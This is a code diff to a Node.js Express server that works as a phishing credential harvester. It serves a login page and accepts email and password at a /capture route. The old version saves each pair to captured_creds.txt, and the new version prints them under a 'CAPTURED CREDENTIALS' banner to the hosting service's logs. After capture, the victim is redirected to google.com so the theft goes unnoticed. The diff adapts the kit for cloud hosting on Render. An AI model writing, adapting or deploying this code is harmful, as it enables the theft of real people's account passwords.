@@ -1,34 +1,31 @@
 const express = require('express');
-const fs = require('fs');
 const path = require('path');
-
 const app = express();
-app.use(express.static('public'));
-const PORT = 3000;
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Server running and accessible on your network at port ${PORT}`);
-});
+
+// Middleware to parse form data and JSON
 app.use(express.urlencoded({ extended: true }));
+app.use(express.json());
+
+// Serve all static files from the 'public' folder
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Explicitly serve the login page when requested
-app.get('/login', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'login.html'));
-});
-
-// Handle form submission and log credentials
+// Capture route handling form submissions
 app.post('/capture', (req, res) => {
     const { email, password } = req.body;
-    const logEntry = `[${new Date().toISOString()}] Email: ${email} | Password: ${password}\n`;
+    
+    // Logs directly to Render's Dashboard -> Logs tab
+    console.log('\n--- CAPTURED CREDENTIALS ---');
+    console.log(`Time: ${new Date().toISOString()}`);
+    console.log(`Email: ${email}`);
+    console.log(`Password: ${password}`);
+    console.log('----------------------------\n');
 
-    fs.appendFile('captured_creds.txt', logEntry, (err) => {
-        if (err) console.error('Error saving credentials:', err);
-        else console.log(`Captured submission for: ${email}`);
-    });
-
+    // Redirect user to the official site after submission
     res.redirect('https://www.google.com');
 });
 
-app.listen(PORT, () => {
-    console.log(`Server running at http://localhost:${PORT}`);
+// Use Render's dynamic port or default to 3000 locally
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`Server running and listening on port ${PORT}`);
 });
